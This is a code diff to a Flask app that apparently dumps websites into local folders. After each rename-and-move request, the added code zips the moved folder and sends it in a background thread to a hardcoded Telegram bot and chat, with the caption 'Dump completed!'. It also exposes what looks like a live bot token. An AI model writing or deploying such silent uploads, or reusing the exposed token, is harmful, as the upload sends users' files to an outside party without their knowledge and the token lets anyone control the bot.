@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, jsonify
-import os, subprocess, shutil, threading, requests, time
+import os, subprocess, shutil, threading, requests, time, zipfile
 
 app = Flask(__name__)
 
@@ -8,7 +8,6 @@ LOG_FILE = os.path.join(os.getcwd(), 'logs', 'latest.log')
 os.makedirs(BASE_DIR, exist_ok=True)
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
-# ✅ Your Telegram bot credentials
 BOT_TOKEN = '7342786184:AAFT2dsNEgPiHasA2f1fP08M_QwxVS1ARYg'
 CHAT_ID = '6064653643'
 
@@ -80,19 +79,25 @@ def get_logs():
             parsed_logs.append(f"🔄 {line.strip()}")
     return jsonify({'logs': parsed_logs})
 
-def send_folder_to_telegram(folder_path):
-    for root, dirs, files in os.walk(folder_path):
-        for file in files:
-            try:
-                file_path = os.path.join(root, file)
-                with open(file_path, 'rb') as f:
-                    requests.post(
-                        f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
-                        data={'chat_id': CHAT_ID},
-                        files={'document': (file, f)}
-                    )
-            except Exception as e:
-                print("Telegram Send Error:", e)
+def zip_folder(folder_path, zip_path):
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                abs_path = os.path.join(root, file)
+                rel_path = os.path.relpath(abs_path, folder_path)
+                zipf.write(abs_path, rel_path)
+
+def send_zip_to_telegram(zip_path, preview_path):
+    try:
+        with open(zip_path, 'rb') as zip_file:
+            caption = f"✅ Dump completed!\n📦: {os.path.basename(zip_path)}\n🔗 Preview: {preview_path}"
+            requests.post(
+                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
+                data={'chat_id': CHAT_ID, 'caption': caption},
+                files={'document': zip_file}
+            )
+    except Exception as e:
+        print("Telegram Error:", e)
 
 @app.route('/rename_and_move', methods=['POST'])
 def rename_and_move():
@@ -105,12 +110,15 @@ def rename_and_move():
     try:
         shutil.move(old_path, new_path)
 
-        # ✅ Automatically send to Telegram after move
-        threading.Thread(target=send_folder_to_telegram, args=(new_path,), daemon=True).start()
+        zip_path = new_path + ".zip"
+        zip_folder(new_path, zip_path)
+
+        preview = f"file://{new_path}/index.html"
+        threading.Thread(target=send_zip_to_telegram, args=(zip_path, preview), daemon=True).start()
 
         return jsonify({
             'status': 'success',
-            'url': f"file://{new_path}/{new}/index.html"
+            'url': preview
         })
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
